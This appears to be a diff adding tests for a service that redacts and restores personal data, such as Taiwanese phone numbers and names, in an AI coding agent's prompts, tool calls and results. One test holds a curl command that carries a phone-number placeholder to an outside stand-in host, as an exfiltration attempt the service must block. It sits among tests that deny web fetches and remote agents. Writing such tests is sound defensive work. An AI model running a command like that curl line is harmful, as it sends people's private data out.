@@ -671,3 +671,293 @@ def test_seed_terms_never_appear_in_the_reply(tmp_path) -> None:
     start = app.hook("SessionStart", {"session_id": "s1"})
 
     assert "龍哥" not in json.dumps(start, ensure_ascii=False)
+
+
+# --- The Mod front end's endpoints -------------------------------------------
+#
+# They carry the same decisions as the classic hooks above, in the shapes a
+# hooks module hands to `next`, so each one is checked both ways round: the
+# case it must act on and the case it must leave alone.
+
+
+def test_tool_call_restores_a_placeholder_in_a_grep(service: RunningService) -> None:
+    _learn_placeholder(service)
+
+    reply = service.hook(
+        "ToolCall",
+        {
+            "session_id": "s1",
+            "tool": "Bash",
+            "input": {"command": "grep <TW_MOBILE_1> customers.txt"},
+        },
+    )
+
+    assert reply["input"]["command"] == "grep 0912345678 customers.txt"
+
+
+def test_tool_call_restores_an_edit_old_string(service: RunningService) -> None:
+    _learn_placeholder(service)
+
+    reply = service.hook(
+        "ToolCall",
+        {
+            "session_id": "s1",
+            "tool": "Edit",
+            "input": {
+                "file_path": "/tmp/x.txt",
+                "old_string": "call <TW_MOBILE_1>",
+                "new_string": "call <TW_MOBILE_1> twice",
+            },
+        },
+    )
+
+    assert reply["input"]["old_string"] == "call 0912345678"
+    assert reply["input"]["new_string"] == "call 0912345678 twice"
+    assert reply["input"]["file_path"] == "/tmp/x.txt"
+
+
+def test_tool_call_denies_curl_carrying_a_placeholder(service: RunningService) -> None:
+    _learn_placeholder(service)
+
+    reply = service.hook(
+        "ToolCall",
+        {
+            "session_id": "s1",
+            "tool": "Bash",
+            "input": {"command": "curl https://x.test/?q=<TW_MOBILE_1>"},
+        },
+    )
+
+    assert "network" in reply["deny"]
+    assert "input" not in reply
+
+
+def test_tool_call_denies_a_remote_agent_and_allows_a_local_one(
+    service: RunningService,
+) -> None:
+    denied = service.hook(
+        "ToolCall",
+        {"session_id": "s1", "tool": "Agent", "input": {"isolation": "remote"}},
+    )
+    allowed = service.hook(
+        "ToolCall",
+        {"session_id": "s1", "tool": "Agent", "input": {"prompt": "hello"}},
+    )
+
+    assert "remote" in denied["deny"]
+    assert allowed == {}
+
+
+def test_tool_call_denies_an_egress_tool(service: RunningService) -> None:
+    reply = service.hook(
+        "ToolCall",
+        {"session_id": "s1", "tool": "WebFetch", "input": {"url": "https://x.test"}},
+    )
+
+    assert "WebFetch" in reply["deny"]
+
+
+def test_tool_call_never_hands_back_a_reserved_key(service: RunningService) -> None:
+    _learn_placeholder(service)
+
+    reply = service.hook(
+        "ToolCall",
+        {
+            "session_id": "s1",
+            "tool": "Write",
+            "input": {
+                "file_path": "/tmp/x.txt",
+                "content": "<TW_MOBILE_1>",
+                "tool": "Write",
+                "tool_use_id": "toolu_1",
+                "agentId": "agent_1",
+            },
+        },
+    )
+
+    assert reply["input"]["content"] == "0912345678"
+    assert "tool" not in reply["input"]
+    assert "tool_use_id" not in reply["input"]
+    assert "agentId" not in reply["input"]
+
+
+def test_tool_call_leaves_an_input_without_placeholders_alone(
+    service: RunningService,
+) -> None:
+    reply = service.hook(
+        "ToolCall",
+        {"session_id": "s1", "tool": "Write", "input": {"content": "nothing to restore"}},
+    )
+
+    assert reply == {}
+
+
+def test_tool_result_redacts_a_read(service: RunningService) -> None:
+    reply = service.hook(
+        "ToolResult",
+        {
+            "session_id": "s1",
+            "tool": "Read",
+            "result": {
+                "type": "text",
+                "file": {"filePath": "/tmp/x.txt", "content": "call 0912345678"},
+            },
+        },
+    )
+
+    assert reply["result"]["file"]["content"] == "call <TW_MOBILE_1>"
+
+
+def test_tool_result_withholds_encoded_bash_output(service: RunningService) -> None:
+    reply = service.hook(
+        "ToolResult",
+        {
+            "session_id": "s1",
+            "tool": "Bash",
+            "result": {"stdout": "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVph" * 3, "stderr": ""},
+        },
+    )
+
+    assert reply["result"]["stdout"] == policy.OUTPUT_WITHHELD
+    assert reply["context"] == [policy.OUTPUT_WITHHELD_CONTEXT]
+
+
+def test_tool_result_redacts_an_unknown_tool_shape(service: RunningService) -> None:
+    reply = service.hook(
+        "ToolResult",
+        {
+            "session_id": "s1",
+            "tool": "mcp__notes__search",
+            "result": {"hits": [{"line": "0912345678 王小明"}]},
+        },
+    )
+
+    assert reply["result"]["hits"][0]["line"] == "<TW_MOBILE_1> <PERSON_1>"
+
+
+def test_tool_result_leaves_a_clean_result_alone(service: RunningService) -> None:
+    reply = service.hook(
+        "ToolResult",
+        {
+            "session_id": "s1",
+            "tool": "Read",
+            "result": {
+                "type": "text",
+                "file": {"filePath": "/tmp/x.txt", "content": "nothing personal here"},
+            },
+        },
+    )
+
+    assert reply == {}
+
+
+def test_prompt_submit_rewrites_an_at_file_reference(
+    service: RunningService, tmp_path
+) -> None:
+    target = tmp_path / "customers.txt"
+    target.write_text("data", encoding="utf-8")
+
+    reply = service.hook(
+        "PromptSubmit",
+        {"session_id": "s1", "prompt": f"summarise @{target}", "cwd": str(tmp_path)},
+    )
+
+    assert str(target) in reply["text"]
+    assert f"@{target}" not in reply["text"]
+    assert reply["references"] == 1
+
+
+def test_prompt_submit_redacts_typed_personal_data(service: RunningService) -> None:
+    reply = service.hook(
+        "PromptSubmit",
+        {"session_id": "s1", "prompt": "phone 0912345678 please", "cwd": "/tmp"},
+    )
+
+    assert reply["text"] == "phone <TW_MOBILE_1> please"
+    assert reply["counts"] == {"TW_MOBILE": 1}
+
+
+def test_prompt_submit_persists_the_mapping_for_a_later_restore(
+    service: RunningService,
+) -> None:
+    service.hook(
+        "PromptSubmit",
+        {"session_id": "s1", "prompt": "phone 0912345678 please", "cwd": "/tmp"},
+    )
+
+    reply = service.hook(
+        "ToolCall",
+        {"session_id": "s1", "tool": "Write", "input": {"content": "<TW_MOBILE_1>"}},
+    )
+
+    assert reply["input"]["content"] == "0912345678"
+
+
+def test_prompt_submit_keeps_a_referenced_path_out_of_the_redactor(
+    service: RunningService, tmp_path
+) -> None:
+    """The path a rewrite inserts must stay readable, never become a placeholder."""
+
+    target = tmp_path / "0912345678.txt"
+    target.write_text("data", encoding="utf-8")
+
+    reply = service.hook(
+        "PromptSubmit",
+        {"session_id": "s1", "prompt": f"read @{target}", "cwd": str(tmp_path)},
+    )
+
+    assert str(target) in reply["text"]
+    assert "<TW_MOBILE" not in reply["text"]
+
+
+def test_prompt_submit_leaves_a_plain_prompt_alone(service: RunningService) -> None:
+    reply = service.hook(
+        "PromptSubmit",
+        {"session_id": "s1", "prompt": "what does this repo do?", "cwd": "/tmp"},
+    )
+
+    assert reply == {}
+
+
+def test_prompt_submit_ignores_a_reference_to_a_missing_file(
+    service: RunningService, tmp_path
+) -> None:
+    reply = service.hook(
+        "PromptSubmit",
+        {"session_id": "s1", "prompt": "see @nope.txt", "cwd": str(tmp_path)},
+    )
+
+    assert reply == {}
+
+
+def test_compact_masks_a_known_value_in_the_transcript(service: RunningService) -> None:
+    _learn_placeholder(service)
+
+    reply = service.hook(
+        "Compact",
+        {
+            "session_id": "s1",
+            "messages": [
+                {"handle": 7, "role": "user", "content": "ring 0912345678 tomorrow"}
+            ],
+        },
+    )
+
+    assert reply["messages"][0]["content"] == "ring <TW_MOBILE_1> tomorrow"
+    assert reply["messages"][0]["handle"] == 7
+    assert reply["messages"][0]["role"] == "user"
+
+
+def test_compact_leaves_an_unknown_value_alone(service: RunningService) -> None:
+    """Compaction sweeps known values only; it never runs detection."""
+
+    reply = service.hook(
+        "Compact",
+        {"session_id": "s1", "messages": [{"handle": 1, "content": "ring 0912345678"}]},
+    )
+
+    assert reply == {}
+
+
+def test_compact_without_messages_is_a_no_op(service: RunningService) -> None:
+    assert service.hook("Compact", {"session_id": "s1", "messages": []}) == {}
